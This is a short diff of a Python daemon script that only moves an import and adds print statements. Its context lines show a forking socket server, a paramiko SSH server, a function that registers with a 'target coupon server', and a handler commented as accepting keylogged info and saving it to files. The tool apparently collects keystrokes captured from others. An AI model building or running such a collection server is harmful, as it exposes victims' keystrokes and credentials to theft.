@@ -42,7 +42,6 @@ import errno
 import random
 import os
 import time
-import re
 import atexit
 import logzero
 from logzero import logger
@@ -54,8 +53,7 @@ import requests
 import threading
 import sys
 import signal
-
-
+import re
 #---------__Change As Required__-----------#
 binds = ("::1",  9500) 
 cwd = os.path.dirname(os.path.realpath(sys.argv[0])) # current working directory for work after daemonizing
@@ -85,6 +83,7 @@ def soup(email='unknown',  firstName='friendly',  lastName='user',  postalCode =
     logger.info("======STARTING REGISTRATION======")
     if page.status_code != 200:
         logger.error("Cannot Locate the target coupon server")
+        print("Cannot Locate the target server")
         return -1 #Failed to make some soup
     
     soup = BeautifulSoup(page.content,  'html.parser')
@@ -263,7 +262,7 @@ class Daemon(object):
     def stop(self):
         pid=getPid(self.pidfile)
         if not pid:
-            print("PID doesnt exist to be removed")
+            print("PID doesnt exist")
             logger.info("pidfile dont exist. deamon not running")
             return
         try:
@@ -328,6 +327,7 @@ class MyDaemon(Daemon):
             sys.exit(1)
     while True:
         #loop and fork per client request
+        print("Waiting...")
 
         client, addr = sock.accept()
         pid = os.fork()
@@ -398,6 +398,7 @@ def handle(conn): #accpet keylogged info and save it to files
         pass
         
     return 0
+    
     
 class Server (paramiko.ServerInterface):
     host_key = paramiko.RSAKey(filename=keyLoc)
